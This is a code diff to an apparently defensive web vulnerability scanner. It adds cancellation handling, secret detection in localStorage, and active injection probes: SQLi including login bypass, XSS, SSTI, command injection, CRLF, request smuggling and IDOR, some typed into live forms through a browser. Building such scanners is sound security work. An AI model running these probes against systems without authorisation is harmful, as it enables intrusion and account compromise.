@@ -3089,12 +5147,54 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
       let browserLinks: string[] = [];
       let browserApiEndpoints: string[] = [];
 
-      const browserResult = await renderWithBrowser(normalizedUrl, log);
+      if (controller.signal.aborted) throw new Error("scan_cancelled");
+
+      const browserAuthSession = (session.bearerToken || session.cookies)
+        ? { cookies: session.cookies, bearerToken: session.bearerToken }
+        : undefined;
+      const browserResult = await renderWithBrowser(normalizedUrl, log, scanId, browserAuthSession);
+      
+      if (controller.signal.aborted) throw new Error("scan_cancelled");
+
       if (browserResult) {
         renderedHtml = browserResult.html;
         runtimeFrameworks = browserResult.runtimeFrameworks;
         browserLinks = browserResult.discoveredLinks;
         browserApiEndpoints = browserResult.interceptedRequests || [];
+      }
+
+      // ── CLIENT-SIDE STORAGE AUDIT (P1: detect JWTs, API keys in localStorage) ──
+      if (visitedUrls.size === 1) {
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
+        log(`🗄️  Auditing client-side storage (localStorage, sessionStorage)...`);
+        const storageFindings = await auditClientStorage(normalizedUrl, log, scanId, browserAuthSession);
+        for (const sf of storageFindings) {
+          const severityMap: Record<string, "CRITICAL" | "HIGH" | "MEDIUM"> = {
+            jwt: "HIGH", "stripe-key": "CRITICAL", "aws-key": "CRITICAL",
+            "sendgrid-key": "CRITICAL", "private-key": "CRITICAL",
+            "github-token": "CRITICAL", "api-key-label": "HIGH",
+            "password-label": "CRITICAL", "auth-token": "MEDIUM",
+          };
+          const severity = severityMap[sf.detectedType] || "MEDIUM";
+          const cvssMap: Record<string, number> = {
+            jwt: 7.5, "stripe-key": 9.5, "aws-key": 9.5,
+            "sendgrid-key": 9.0, "private-key": 9.8,
+            "github-token": 9.0, "api-key-label": 7.5,
+            "password-label": 9.5, "auth-token": 6.5,
+          };
+          findings.push({
+            type: "client-storage-sensitive-data",
+            severity,
+            url: normalizedUrl,
+            parameter: sf.key,
+            evidence: `Sensitive data found in ${sf.storageType}: key="${sf.key}" contains ${sf.detectedType}. Value snippet: "${sf.valueSnippet.slice(0, 80)}...". Client-side storage is accessible to any XSS attack on the page.`,
+            cvssScore: cvssMap[sf.detectedType] || 6.5,
+            cveId: "CWE-922",
+            confidence: CONFIDENCE.DETERMINISTIC,
+            validationSteps: [`${sf.storageType}.getItem("${sf.key}") returned ${sf.detectedType} pattern`],
+            isVerified: true,
+          });
+        }
       }
 
       if (fetchSucceeded || browserResult) {
@@ -3103,13 +5203,23 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         const discoveredLinks = [...new Set([...staticLinks, ...browserLinks])].slice(0, 50);
 
         // Queue newly discovered same-origin links
+        // FIX: Preserve hash fragments for SPA hash-routing (Angular /#/login, React /#/basket etc.)
+        // The old code stripped all hashes, causing ALL Juice Shop pages to collapse to
+        // http://localhost:3001/ which was already visited — so only 1 page was ever scanned.
         const targetHost = new URL(targetUrl).hostname;
         for (const link of discoveredLinks) {
           try {
             const cleanLink = new URL(link, targetUrl);
-            cleanLink.hash = "";
+            // For SPA hash routing, the hash IS the page identity — preserve it
+            // For normal pages, strip the hash to avoid duplicate crawl of anchors
+            const isHashRoute = cleanLink.hash.startsWith('#/'); // /#/login, /#/basket etc.
+            if (!isHashRoute) cleanLink.hash = "";
             const linkStr = cleanLink.toString();
-            if (cleanLink.hostname === targetHost && !visitedUrls.has(linkStr) && !urlQueue.includes(linkStr)) {
+            if (
+              cleanLink.hostname === targetHost &&
+              !visitedUrls.has(linkStr) &&
+              !urlQueue.includes(linkStr)
+            ) {
               urlQueue.push(linkStr);
             }
           } catch { /* skip */ }
@@ -3120,6 +5230,8 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         const discoveredParamUrls = extractParamUrls(renderedHtml, normalizedUrl);
         const discoveredForms = extractForms(renderedHtml, normalizedUrl);
 
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
+
         log(`🕸️   Page audit complete — ${discoveredLinks.length} links, ${apiEndpoints.length} API refs, ${discoveredParamUrls.length} param URLs, ${discoveredForms.length} form(s)`);
 
         // JS bundle analysis
@@ -3129,30 +5241,75 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
           log(`🎯  JS analysis found ${jsBundleEndpoints.length} injectable POST endpoint(s): ${jsBundleEndpoints.map(e => e.path).join(", ")}`);
         }
 
+        // OpenAPI / Swagger discovery (runs only on homepage to avoid redundant spec probing)
+        if (normalizedUrl === targetUrl) {
+          log(`📋  Probing for OpenAPI/Swagger specs to discover hidden API surface...`);
+          const openApiEndpoints = await discoverOpenApiEndpoints(targetUrl, log);
+          if (openApiEndpoints.length > 0) {
+            // Merge with jsBundleEndpoints — both feed the same injection probes
+            jsBundleEndpoints.push(...openApiEndpoints);
+            log(`🔗  OpenAPI endpoints merged: ${jsBundleEndpoints.length} total injectable endpoint(s)`);
+          }
+        }
+
+        // ── API ENDPOINT INVENTORY REGISTRATION ─────────────────────────────
+        const allDiscoveredApiRoutes = [...new Set([
+          ...jsBundleEndpoints.map(e => e.path),
+          ...apiEndpoints,
+        ])];
+        if (allDiscoveredApiRoutes.length > 0) {
+          for (const apiRoute of allDiscoveredApiRoutes.slice(0, 30)) {
+            const fullApiUrl = safeUrlJoin(normalizedUrl, apiRoute) || apiRoute;
+            const matchingBundle = jsBundleEndpoints.find(e => e.path === apiRoute);
+            const fieldsStr = matchingBundle && matchingBundle.fields.length > 0 ? matchingBundle.fields.join(", ") : "n/a";
+            findings.push({
+              type: "api-endpoint-discovered",
+              severity: "INFO",
+              url: fullApiUrl,
+              parameter: fieldsStr !== "n/a" ? fieldsStr : undefined,
+              evidence: `Discovered active API endpoint surface route: ${apiRoute} (Parameters/Fields: ${fieldsStr}). Extracted from JS bundles, network interception, or OpenAPI specifications.`,
+              cvssScore: 0.0,
+              cveId: "CWE-200",
+              confidence: CONFIDENCE.DETERMINISTIC,
+              validationSteps: [`API route "${apiRoute}" identified during surface mapping`],
+              isVerified: true,
+            });
+          }
+        }
+
         // Framework fingerprinting (L2)
         const techs: string[] = [...runtimeFrameworks];
-        if (!techs.includes("Next.js") && /__NEXT_DATA__|_next\/static/.test(renderedHtml)) techs.push("Next.js");
-        if (!techs.includes("Nuxt.js") && /window\.__nuxt__|__NUXT__/.test(renderedHtml)) techs.push("Nuxt.js");
-        if (!techs.includes("Angular") && /ng-version=|angular\.js/i.test(renderedHtml)) techs.push("Angular");
-        if (!techs.includes("Vue.js") && /__VUE__|window\.__vue__/i.test(renderedHtml)) techs.push("Vue.js");
-        if (!techs.includes("React") && /react(?:\.production|\.development)?\.min\.js|__react_/i.test(renderedHtml)) techs.push("React");
-        if (!techs.includes("SvelteKit") && /__sveltekit|sveltekit-preload/i.test(renderedHtml)) techs.push("SvelteKit");
-        if (!techs.includes("Remix") && /__remix_server_manifest__|remix-island/i.test(renderedHtml)) techs.push("Remix");
-        if (!techs.includes("Gatsby") && /gatsby-chunk-mapping|gatsby-image/i.test(renderedHtml)) techs.push("Gatsby");
-        if (!techs.includes("Astro") && /astro-page|\/@astrojs\//i.test(renderedHtml)) techs.push("Astro");
-        if (/wp-content\/|wp-includes\//i.test(renderedHtml)) techs.push("WordPress");
-        if (/drupal\.settings|Drupal\./i.test(renderedHtml)) techs.push("Drupal");
-        if (/Joomla!/i.test(renderedHtml)) techs.push("Joomla");
-        if (/shopify\.com\/s\/files/i.test(renderedHtml)) techs.push("Shopify");
-        if (/jquery[.-]([\d.]+)(\.min)?\.js/i.test(renderedHtml)) techs.push("jQuery");
-        if (/csrfmiddlewaretoken/i.test(renderedHtml)) techs.push("Django");
-        if (/laravel_session|laravel\/framework/i.test(renderedHtml + (headers["set-cookie"] ?? ""))) techs.push("Laravel");
-        if (/\/api\/trpc\//i.test(renderedHtml)) techs.push("tRPC");
-        if (/\/@vite\/client|vite\.config/i.test(renderedHtml)) techs.push("Vite");
+        const serverHeader = headers["server"] ?? "";
         const poweredBy = headers["x-powered-by"] ?? "";
+        const setCookie = headers["set-cookie"] ?? "";
+        const combinedText = renderedHtml + poweredBy + serverHeader + setCookie;
+
+        if (!techs.includes("Next.js") && /__NEXT_DATA__|_next\/static/i.test(combinedText)) techs.push("Next.js");
+        if (!techs.includes("Nuxt.js") && /window\.__nuxt__|__NUXT__|_nuxt\//i.test(combinedText)) techs.push("Nuxt.js");
+        if (!techs.includes("Angular") && /ng-version=|angular\.js|app-root|router-outlet/i.test(combinedText)) techs.push("Angular");
+        if (!techs.includes("Vue.js") && /__VUE__|window\.__vue__|data-v-/i.test(combinedText)) techs.push("Vue.js");
+        if (!techs.includes("React") && /react(?:\.production|\.development)?\.js|__react|_reactListening|data-reactroot/i.test(combinedText)) techs.push("React");
+        if (!techs.includes("SvelteKit") && /__sveltekit|sveltekit-preload/i.test(combinedText)) techs.push("SvelteKit");
+        if (!techs.includes("Remix") && /__remix_server_manifest__|remix-island/i.test(combinedText)) techs.push("Remix");
+        if (!techs.includes("Gatsby") && /gatsby-chunk-mapping|gatsby-image/i.test(combinedText)) techs.push("Gatsby");
+        if (!techs.includes("Astro") && /astro-page|\/@astrojs\//i.test(combinedText)) techs.push("Astro");
+        if (!techs.includes("Django") && /csrfmiddlewaretoken|csrftoken|django/i.test(combinedText)) techs.push("Django");
+        if (!techs.includes("Flask") && /werkzeug|flask/i.test(combinedText)) techs.push("Flask");
+        if (!techs.includes("FastAPI") && /fastapi|uvicorn|swagger-ui|redoc-container/i.test(combinedText)) techs.push("FastAPI");
+        if (/gunicorn|uvicorn|werkzeug|python/i.test(combinedText)) techs.push("Python");
+        if (/wp-content\/|wp-includes\//i.test(combinedText)) techs.push("WordPress");
+        if (/drupal\.settings|Drupal\./i.test(combinedText)) techs.push("Drupal");
+        if (/Joomla!/i.test(combinedText)) techs.push("Joomla");
+        if (/shopify\.com\/s\/files/i.test(combinedText)) techs.push("Shopify");
+        if (/jquery[.-]([\d.]+)(\.min)?\.js/i.test(combinedText)) techs.push("jQuery");
+        if (/laravel_session|laravel\/framework/i.test(combinedText)) techs.push("Laravel");
+        if (/\/api\/trpc\//i.test(combinedText)) techs.push("tRPC");
+        if (/\/@vite\/client|vite\.config/i.test(combinedText)) techs.push("Vite");
         if (/express/i.test(poweredBy)) techs.push("Express.js");
-        if (/php/i.test(poweredBy)) techs.push("PHP");
-        if (/asp\.net/i.test(poweredBy)) techs.push("ASP.NET");
+        if (/php/i.test(poweredBy + setCookie)) techs.push("PHP");
+        if (/asp\.net|\.AspNetCore/i.test(poweredBy + setCookie)) techs.push("ASP.NET");
+        if (/JSESSIONID|spring/i.test(setCookie + combinedText)) techs.push("Spring Boot");
+        if (/_session_id|rails/i.test(setCookie + combinedText)) techs.push("Ruby on Rails");
         const uniqueTechs = [...new Set(techs)];
         if (uniqueTechs.length > 0) {
           findings.push({
@@ -3187,7 +5344,19 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         const inlineScripts = [...renderedHtml.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi)].map(m => m[1]).join("\n");
         for (const { pattern, label } of DOM_XSS_SINKS) {
           if (label.includes("dangerouslySetInnerHTML")) {
-            if (pattern.test(renderedHtml) && /location\.search|window\.location|params|query|router/i.test(renderedHtml)) htmlSinks.push(label);
+            // FP-FIX: Only flag dangerouslySetInnerHTML when it directly receives
+            // URL-sourced data. Every Next.js/React app uses dangerouslySetInnerHTML
+            // internally (for <head>, __NEXT_DATA__, styled-jsx). The words 'router',
+            // 'params', 'query' match next/router in ALL Next.js apps.
+            // Instead, look for dangerouslySetInnerHTML near URL data sources
+            // within the same code block (inline scripts only).
+            if (pattern.test(inlineScripts)) {
+              // Check inline scripts for dangerouslySetInnerHTML + direct URL-source data
+              const urlSourcePattern = /(?:location\.search|location\.hash|document\.URL|window\.location\.href|URLSearchParams|document\.referrer)[\s\S]{0,200}dangerouslySetInnerHTML|dangerouslySetInnerHTML[\s\S]{0,200}(?:location\.search|location\.hash|document\.URL|window\.location\.href|URLSearchParams|document\.referrer)/i;
+              if (urlSourcePattern.test(inlineScripts)) {
+                htmlSinks.push(label);
+              }
+            }
           } else if (label.includes("eval") || label.includes("document.write")) {
             if (pattern.test(inlineScripts)) htmlSinks.push(label);
           } else {
@@ -3429,21 +5598,31 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         }
 
         // Active injection probing (Phase 8)
-        const probeTargets = [...new Set(discoveredParamUrls)].slice(0, 8);
+        const probeTargets = [...new Set(discoveredParamUrls)].slice(0, 30);
+
+        // Inject stored-XSS markers for next-page detection
+        await injectStoredXSSMarkers(discoveredForms, discoveredParamUrls, normalizedUrl, storedXSSMarkers, session);
+
+        // Check if a previously injected stored-XSS marker surfaced on this page
+        const storedXSSResult = checkStoredXSSReflection(renderedHtml, normalizedUrl, storedXSSMarkers);
+        if (storedXSSResult) findings.push(storedXSSResult);
+
         if (probeTargets.length > 0) {
           log(`⚡  Active injection probes (SQLi, XSS, CmdInj, PathTraversal) on ${probeTargets.length} URL(s)...`);
           const probeResults = await Promise.all(
             probeTargets.flatMap((url) => [
-              probeReflectedXSS(url),
-              probeSQLiError(url),
+              probeReflectedXSS(url, session),
+              probeSQLiError(url, session),
               probeCommandInjection(url),
               probePathTraversal(url),
+              probeCRLFInjection(url),
             ])
           );
 
           let xssFound = false; let sqliFound = false;
           let cmdInjFound = false; let lfiFound = false;
           let deserFound = false; let blindSsrfFound = false;
+          let crlfFound = false;
 
           for (const result of probeResults) {
             if (!result) continue;
@@ -3451,6 +5630,7 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
             else if (result.type === "sql-injection-reflected" && !sqliFound) { findings.push(result); sqliFound = true; }
             else if (result.type === "command-injection" && !cmdInjFound) { findings.push(result); cmdInjFound = true; }
             else if (result.type === "path-traversal-lfi" && !lfiFound) { findings.push(result); lfiFound = true; }
+            else if (result.type === "crlf-injection" && !crlfFound) { findings.push(result); crlfFound = true; }
           }
 
           // Deserialization & Blind SSRF probes
@@ -3467,12 +5647,13 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         }
 
         // Form-based injection probing (Phase 9)
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
         if (discoveredForms.length > 0) {
           log(`📝  Form injection probing on ${discoveredForms.length} form(s)...`);
           const formProbeResults = await Promise.all(
             discoveredForms.flatMap((form) => [
-              probeFormSQLi(form),
-              probeFormXSS(form),
+              probeFormSQLi(form, session),
+              probeFormXSS(form, session),
               probeFormSSTI(form),
             ])
           );
@@ -3487,15 +5668,19 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         }
 
         // REST/JSON API SQLi probing (Phase 9b)
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
         log(`🔐  Probing REST/JSON API SQLi...`);
         let apiSqliFound = false;
         if (jsBundleEndpoints.length > 0) {
           for (const endpoint of jsBundleEndpoints) {
+            if (controller.signal.aborted) throw new Error("scan_cancelled");
             if (apiSqliFound) break;
             const endpointUrl = new URL(endpoint.path, targetUrl).toString();
             for (const payload of SQLI_PAYLOADS) {
+              if (controller.signal.aborted) throw new Error("scan_cancelled");
               if (apiSqliFound) break;
               for (const field of endpoint.fields) {
+                if (controller.signal.aborted) throw new Error("scan_cancelled");
                 if (apiSqliFound) break;
                 const body: Record<string, string> = {};
                 for (const f of endpoint.fields) body[f] = f === field ? payload : "test";
@@ -3548,37 +5733,186 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
         }
 
         if (!apiSqliFound) {
-          const restSqliResult = await probeRestApiSQLi(normalizedUrl);
+          const restSqliResult = await probeRestApiSQLi(normalizedUrl, session);
           if (restSqliResult) findings.push(restSqliResult);
         }
 
-        // Advanced probes (SSTI, blind timing SQLi, prototype pollution) (Phase 10)
+        // IMPROVEMENT #3: Run SSTI + Command Injection probes on JS-discovered endpoints
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
+        if (jsBundleEndpoints.length > 0) {
+          log(`🧪  Probing JS-discovered endpoints for SSTI and Command Injection...`);
+          for (const endpoint of jsBundleEndpoints.slice(0, 3)) {
+            if (controller.signal.aborted) throw new Error("scan_cancelled");
+            try {
+              const endpointUrl = new URL(endpoint.path, targetUrl).toString();
+              for (const field of endpoint.fields) {
+                if (controller.signal.aborted) throw new Error("scan_cancelled");
+                // SSTI via JSON body
+                for (const { payload, marker, engines } of SSTI_PROBES) {
+                  try {
+                    const body: Record<string, string> = {};
+                    for (const f of endpoint.fields) body[f] = f === field ? payload : "test";
+                    const resp = await fetch(endpointUrl, {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
+                      body: JSON.stringify(body),
+                      signal: AbortSignal.timeout(6000),
+                      // @ts-ignore
+                      next: { revalidate: 0 },
+                    }).catch(() => null);
+                    if (!resp) continue;
+                    const text = await resp.text();
+                    if (text.includes(marker) && !text.includes(payload)) {
+                      // Multi-math verification to rule out coincidental number reflection
+                      let mathHits = 0;
+                      const confirmExprs = [{ p: "{{7*8}}", e: "56" }, { p: "{{100*2}}", e: "200" }];
+                      for (const { p, e } of confirmExprs) {
+                        try {
+                          const confirmBody: Record<string, string> = {};
+                          for (const f of endpoint.fields) confirmBody[f] = f === field ? p : "test";
+                          const r2 = await fetch(endpointUrl, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
+                            body: JSON.stringify(confirmBody),
+                            signal: AbortSignal.timeout(5000),
+                            // @ts-ignore
+                            next: { revalidate: 0 },
+                          }).catch(() => null);
+                          if (!r2) continue;
+                          const b2 = await r2.text();
+                          if (b2.includes(e) && !b2.includes(p)) mathHits++;
+                        } catch { /* next */ }
+                      }
+                      if (mathHits < 1) continue; // Skip single coincidental match
+
+                      findings.push({
+                        type: "ssti-injection",
+                        severity: "CRITICAL",
+                        url: endpointUrl,
+                        parameter: field,
+                        evidence: `SSTI confirmed via JS-discovered API endpoint (multi-math verified). Expression "${payload}" in JSON field "${field}" was evaluated by the template engine (${engines}) and returned "${marker}" along with ${mathHits}/2 math confirmations.`,
+                        cvssScore: 9.8,
+                        cveId: "CWE-94",
+                        confidence: CONFIDENCE.EXEC_VERIFIED,
+                        validationSteps: [`"${payload}" → "${marker}" in JSON field "${field}"`, `${mathHits}/2 additional math expressions evaluated`],
+                        isVerified: true,
+                      });
+                    }
+                  } catch { /* next */ }
+                }
+              }
+            } catch { /* next endpoint */ }
+          }
+        }
+
+        // Advanced probes (SSTI, blind timing SQLi, boolean-blind SQLi, prototype pollution) (Phase 10)
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
         if (probeTargets.length > 0) {
-          log(`🧪  Advanced probes (SSTI, Blind Timing SQLi, Prototype Pollution, HTML injection)...`);
+          log(`🧪  Advanced probes (SSTI, Blind SQLi Timing+Boolean, Prototype Pollution, HTML injection)...`);
           const advancedResults = await Promise.all(
             probeTargets.flatMap((url) => [
               probeSSTI(url),
               probeBlindSQLiTiming(url),
+              probeBlindSQLiBooleanDiff(url),
               probePrototypePollution(url),
               probeHTMLInjection(url),
             ])
           );
-          let sstiFound = false; let blindSqliFound = false;
+          let sstiFound = false; let blindSqliTimingFound = false;
+          let blindSqliBooleanFound = false;
           let protoFound = false; let htmlInjFound = false;
           for (const result of advancedResults) {
             if (!result) continue;
             if (result.type === "ssti-injection" && !sstiFound) { findings.push(result); sstiFound = true; }
-            else if (result.type === "sql-injection-blind-timing" && !blindSqliFound) { findings.push(result); blindSqliFound = true; }
+            else if (result.type === "sql-injection-blind-timing" && !blindSqliTimingFound) { findings.push(result); blindSqliTimingFound = true; }
+            else if (result.type === "sql-injection-blind-boolean" && !blindSqliBooleanFound) { findings.push(result); blindSqliBooleanFound = true; }
             else if (result.type === "prototype-pollution" && !protoFound) { findings.push(result); protoFound = true; }
             else if (result.type === "html-injection" && !htmlInjFound) { findings.push(result); htmlInjFound = true; }
           }
         }
 
+        // ── PHASE 9c: INTERACTIVE BROWSER-BASED INJECTION ─────────────────────────
+        // Uses Playwright to type payloads into live forms, click submit,
+        // and analyze the actual network request/response.
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
+        if (discoveredForms.length > 0 || probeTargets.length > 0) {
+          log(`🎭  Phase 9c: Interactive browser injection (typing payloads into live forms)...`);
+          const interactiveResults = await interactiveFormInjection(
+            normalizedUrl, log, scanId, browserAuthSession, 5, 3
+          );
+
+          for (const ir of interactiveResults) {
+            // Analyze the captured response for SQLi indicators
+            if (ir.payloadCategory === "sqli") {
+              const sqlHit = SQL_ERROR_PATTERNS_ACTIVE.find(p => p.test(ir.responseBody));
+              if (sqlHit) {
+                findings.push(verifiedFinding(
+                  {
+                    type: "sql-injection-reflected",
+                    severity: "CRITICAL",
+                    url: ir.requestUrl,
+                    parameter: ir.fieldName,
+                    evidence: `SQL Injection confirmed via interactive browser injection. Payload "${ir.payload}" typed into field "${ir.fieldName}" triggered SQL error in response. Request: ${ir.requestMethod} ${ir.requestUrl}`,
+                    cvssScore: 9.8,
+                    cveId: "CWE-89",
+                  },
+                  [`Typed payload "${ir.payload}" into field "${ir.fieldName}"`, `Submitted form via browser click`, `Response (${ir.responseStatus}) contained SQL error pattern`],
+                  CONFIDENCE.EXEC_VERIFIED
+                ));
+              }
+              // Check for auth bypass: SQLi payload + successful login response
+              if (
+                ir.responseStatus === 200 &&
+                (ir.responseBody.includes("token") || ir.responseBody.includes("authentication") || ir.responseBody.includes("Bearer")) &&
+                (ir.payload.includes("OR") || ir.payload.includes("1=1") || ir.payload.includes("--"))
+              ) {
+                findings.push(verifiedFinding(
+                  {
+                    type: "sql-injection-auth-bypass",
+                    severity: "CRITICAL",
+                    url: ir.requestUrl,
+                    parameter: ir.fieldName,
+                    evidence: `SQL Injection Authentication Bypass confirmed via browser interaction. Payload "${ir.payload}" in field "${ir.fieldName}" returned an auth token. An attacker can bypass login without valid credentials.`,
+                    cvssScore: 9.8,
+                    cveId: "CWE-89",
+                  },
+                  [`Typed SQLi payload into login form`, `Received auth token in response`],
+                  CONFIDENCE.EXEC_VERIFIED
+                ));
+              }
+            }
+
+            // Analyze for XSS reflection
+            if (ir.payloadCategory === "xss") {
+              if (ir.responseBody.includes(ir.payload) || ir.responseBody.includes("<vulnscanXSStag>")) {
+                findings.push(verifiedFinding(
+                  {
+                    type: "reflected-xss",
+                    severity: "HIGH",
+                    url: ir.requestUrl,
+                    parameter: ir.fieldName,
+                    evidence: `Reflected XSS confirmed via interactive browser injection. Payload "${ir.payload}" typed into field "${ir.fieldName}" was reflected unescaped in the response.`,
+                    cvssScore: 7.5,
+                    cveId: "CWE-79",
+                  },
+                  [`Typed XSS payload into field "${ir.fieldName}"`, `Payload reflected in response body`],
+                  CONFIDENCE.EXEC_VERIFIED
+                ));
+              }
+            }
+
+            // Analyze for SSTI (Interactive SSTI is already multi-math verified by probeFormSSTI and probeSSTI)
+          }
+        }
+
         // Infrastructure probes on current page's APIs
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
         const apiEndpointsForMethods = extractApiEndpoints(renderedHtml, normalizedUrl);
         const infraResults = await Promise.all([
           probeHostHeaderInjection(normalizedUrl),
-          probeCORSReflection(normalizedUrl),
+          probeCachePoisoning(normalizedUrl),
+          probeHTTPRequestSmuggling(normalizedUrl),
+          probeCORSReflection(normalizedUrl, [...apiEndpoints, ...jsBundleEndpoints.map(e => { try { return new URL(e.path, normalizedUrl).toString(); } catch { return ""; } }).filter(Boolean)], session),
           probeDangerousHTTPMethods(normalizedUrl, apiEndpointsForMethods),
           probeXXE(normalizedUrl),
           probeDirectoryListing(normalizedUrl, homepageHtml),
@@ -3588,9 +5922,26 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
           probeNoSQLi(normalizedUrl, jsBundleEndpoints),
           probeJWTNone(normalizedUrl),
           probeExposedBackupFiles(normalizedUrl, homepageHtml),
-          probeActiveOpenRedirect(renderedHtml, normalizedUrl),
-          probeIDORWithDualToken(normalizedUrl, jsBundleEndpoints),
+          probeActiveOpenRedirect(renderedHtml, normalizedUrl, discoveredParamUrls),
+          probeIDORWithDualToken(normalizedUrl, jsBundleEndpoints, session),
         ]);
+
+        // New vulnerability detection probes (run on first page only, regardless of URL matching)
+        if (controller.signal.aborted) throw new Error("scan_cancelled");
+        if (visitedUrls.size === 1) {
+          log(`🔬  Running new vulnerability detection probes (File Upload, Mass Assignment, Business Logic, Password Policy, Subdomains, Session Fixation)...`);
+          const fileUploadFindings = await probeFileUploadVulnerabilities(targetUrl, renderedHtml);
+          const massAssignmentFindings = await probeMassAssignment(targetUrl, jsBundleEndpoints, session);
+          const businessLogicFindings = await probeBusinessLogicVulnerabilities(targetUrl, session);
+          const passwordPolicyFinding = await probePasswordPolicy(targetUrl, session);
+          const subdomainFinding = await probeCommonSubdomains(targetUrl);
+          const sessionFixationFinding = await probeSessionFixationRegeneration(targetUrl, session);
+
+          findings.push(...fileUploadFindings, ...massAssignmentFindings, ...businessLogicFindings);
+          if (passwordPolicyFinding) findings.push(passwordPolicyFinding);
+          if (subdomainFinding) findings.push(subdomainFinding);
+          if (sessionFixationFinding) findings.push(sessionFixationFinding);
+        }
         for (const result of infraResults) {
           if (result) findings.push(result);
         }
@@ -3603,24 +5954,42 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
     for (const result of scaFindings) {
       if (result) findings.push(result);
     }
+    // Merge TLS results (were launched in parallel since Phase 0c)
+    try {
+      const tlsFindings = await tlsPromise;
+      for (const tf of tlsFindings) findings.push(tf);
+      log(`🔒  Phase 0c complete — ${tlsFindings.length} TLS/SSL finding(s) merged.`);
+    } catch (tlsErr) {
+      log(`⚠️   TLS probe error: ${tlsErr instanceof Error ? tlsErr.message : String(tlsErr)}`);
+    }
 
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     // ANALYZING PHASE – Awaiting Background AI Reports
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     if (backgroundAiPromises.length > 0) {
       await prisma.scan.update({ where: { id: scanId }, data: { status: "ANALYZING" } });
       log(`📊  Awaiting ${backgroundAiPromises.length} background AI remediation report(s) to finish...`);
       await Promise.allSettled(backgroundAiPromises);
     }
 
+    // Determine final status: COMPLETED vs user-cancelled
+    const wasCancelled = controller.signal.aborted;
+    const finalStatus = wasCancelled ? "FAILED" : "COMPLETED";
+
     const updatedScan = await prisma.scan.update({
       where: { id: scanId },
-      data: { status: "COMPLETED", completedAt: new Date() },
+      data: { status: finalStatus, completedAt: new Date() },
     });
 
-    log(`🎉  Scan complete — ${findings.length} finding(s) saved with AI remediation reports!`);
+    if (wasCancelled) {
+      log(`🛑  Scan stopped by user — ${findings.length} finding(s) saved before cancellation.`);
+    } else {
+      log(`🎉  Scan complete — ${findings.length} finding(s) saved with AI remediation reports!`);
+    }
     log(`📋  View results in the Audits Dashboard. Export JSON available on the findings screen.`);
     cleanupScan(scanId);
+    await destroyBrowser(scanId);
+    cleanupScanController(scanId);
 
     if (updatedScan.email) {
       log(`📨  Sending JSON report to ${updatedScan.email}...`);
@@ -3629,6 +5998,29 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
       });
     }
   } catch (scanErr) {
+    const isCancelled = controller.signal.aborted || (scanErr instanceof Error && scanErr.message === "scan_cancelled");
+    if (isCancelled) {
+      log(`🛑  Scan stopped by user — ${findings.length} finding(s) saved before cancellation.`);
+      cleanupScan(scanId);
+      cleanupScanController(scanId);
+      await destroyBrowser(scanId);
+      try {
+        const updatedScan = await prisma.scan.update({
+          where: { id: scanId },
+          data: { status: "FAILED", completedAt: new Date() }
+        });
+        if (updatedScan.email) {
+          log(`📨  Sending cancellation notification email to ${updatedScan.email}...`);
+          sendScanReportEmail(scanId, updatedScan.email).catch((e) => {
+            console.error("Failed to send report email after cancellation:", e);
+          });
+        }
+      } catch (e) {
+        console.error("Failed to set FAILED status on cancellation:", e);
+      }
+      return;
+    }
+
     console.error(`❌ Scan [${scanId}] failed:`, scanErr);
     let errorMsg = "An unexpected error occurred.";
     if (scanErr instanceof Error) {
@@ -3640,6 +6032,7 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
     }
     log(`❌  Scan failed: ${errorMsg}`);
     cleanupScan(scanId);
+    cleanupScanController(scanId);
     try {
       const updatedScan = await prisma.scan.update({
         where: { id: scanId },
